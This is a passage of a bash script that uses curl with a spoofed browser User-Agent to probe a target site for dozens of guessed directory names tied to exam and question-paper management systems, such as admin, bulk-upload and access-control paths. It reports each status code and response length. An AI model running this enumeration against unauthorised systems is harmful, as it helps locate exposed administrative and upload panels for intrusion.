payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["WorkflowQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"WorkflowQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystemQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystemQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MgmtQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MgmtQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchPlatform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchPlatform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadDashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadDashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoDataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoDataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUploadQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUploadQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSyncQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSyncQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterDataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterDataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperFileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperFileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

